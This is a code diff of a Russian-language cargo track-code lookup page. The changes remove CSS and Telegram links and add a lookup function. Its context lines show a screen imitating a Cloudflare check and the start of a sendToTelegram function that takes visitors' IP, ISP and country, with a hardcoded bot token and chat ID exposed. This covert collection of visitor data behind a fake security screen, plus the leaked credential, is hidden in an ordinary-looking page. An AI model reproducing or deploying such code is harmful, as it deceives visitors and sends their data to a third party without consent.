@@ -70,12 +70,6 @@
             box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
         }
 
-        input[type="text"]:focus {
-            border-color: #4CAF50;
-            box-shadow: 0 4px 12px rgba(0, 255, 0, 0.4);
-            transform: scale(1.02);
-        }
-
         button {
             padding: 14px 20px;
             background: #4CAF50;
@@ -89,52 +83,13 @@
             margin-top: 15px;
         }
 
-        button:hover {
-            background: #45a049;
-            box-shadow: 0 8px 16px rgba(0, 255, 0, 0.5);
-        }
-
-        button:active {
-            transform: scale(0.95);
-            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.3);
-        }
-
         .result {
             margin-top: 20px;
             font-size: 20px;
             font-weight: bold;
         }
 
-        .button-container {
-            display: flex;
-            justify-content: center;
-            margin-top: 20px;
-            gap: 15px;
-        }
-
-        .custom-button {
-            padding: 12px 18px;
-            background: #87CEEB;
-            color: white;
-            border-radius: 30px;
-            text-decoration: none;
-            font-size: 16px;
-            transition: all 0.2s ease;
-            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.3);
-        }
-
-        .custom-button:hover {
-            background: #66B2E6;
-            transform: scale(1.05);
-            box-shadow: 0 8px 16px rgba(0, 0, 255, 0.5);
-        }
-
-        .custom-button:active {
-            transform: scale(0.95);
-            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.3);
-        }
-
-        /* Стиль экрана проверки Cloudflare */
+        /* Экран проверки Cloudflare */
         #loadingScreen {
             position: fixed;
             top: 0;
@@ -182,12 +137,31 @@
     </div>
     <button onclick="searchTrack()">Проверить</button>
     <div class="result" id="resultMessage"></div>
-    <div class="button-container">
-        <a href="https://t.me/luxcargotj" class="custom-button">Группа Telegram</a>
-        <a href="https://t.me/smvvx" class="custom-button">Написать админу</a>
-    </div>
 
+    <script src="trackcodes.js"></script>
     <script>
+        function searchTrack() {
+            const input = document.getElementById('trackInput').value.trim();
+            const resultMessage = document.getElementById('resultMessage');
+
+            resultMessage.textContent = '';
+
+            if (typeof trackCodes !== 'undefined' && Array.isArray(trackCodes)) {
+                let found = trackCodes.find(track => track.code === input);
+
+                if (found) {
+                    resultMessage.innerHTML = `✅ Найден трек-код: <strong>${found.code}</strong><br>📦 Дата прибытия: <strong>${found.date}</strong>`;
+                    resultMessage.style.color = "#4CAF50";
+                } else {
+                    resultMessage.innerHTML = '❌ Трек-код не найден!';
+                    resultMessage.style.color = "#FF5733";
+                }
+            } else {
+                resultMessage.innerHTML = '⚠ Ошибка загрузки базы данных!';
+                resultMessage.style.color = "yellow";
+            }
+        }
+
         function sendToTelegram(ip, isp, country) {
             const botToken = "7840125369:AAH6xDS0673mmimBxIx6JR69oxj1x8Rx77g";
             const chatId = "8110257277";
